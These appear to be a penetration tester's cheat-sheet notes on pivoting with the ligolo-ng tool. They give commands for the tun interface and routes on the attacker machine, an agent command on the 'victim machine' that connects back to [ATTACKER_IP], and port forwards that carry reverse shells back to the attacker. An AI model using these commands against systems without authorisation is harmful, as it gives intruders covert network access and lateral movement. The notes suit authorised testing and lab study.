https://github.com/Nicocha30/ligolo-ng
# Attacker machine
## Create new tun interface:
```bash
sudo ip tuntap add user kali mode tun ligolo
```
```bash
sudo ip link set ligolo up
```
```bash
ip a show
```
```bash
sudo ip route add $(IP_ADDRESS)/24 dev ligolo
```
i.e.
```bash
sudo ip route add 192.168.1.0/24 dev ligolo
```
Can create self signed certs with -selfcert but -autocert should be used as we have internet access.

Use proxy from this machine:
```bash
ligolo-proxy -selfcert/-autocert
```
When the connection is receieved:
```
session
```
```
1
```
```
start
```
# Victim machine
```
./agent -connect [ATTACKER_IP]:11601
```
If cert issues:
```
-ignore-cert
```
# Port Forwarding
If revshells or tools need to connect back to the attacker device, a port forward is required...

On ligolo:
```
listener_add --addr 0.0.0.0:1234 --to [ATTACKER_IP]:4444
```
```
listener_add --addr 0.0.0.0:1235 --to [ATTACKER_IP]:80
```
The following two commands forward any traffic that goes to ligolo victim machine at ports 1234 and 1235 onto the attacker machine at ports 4444 and 80 respectively.
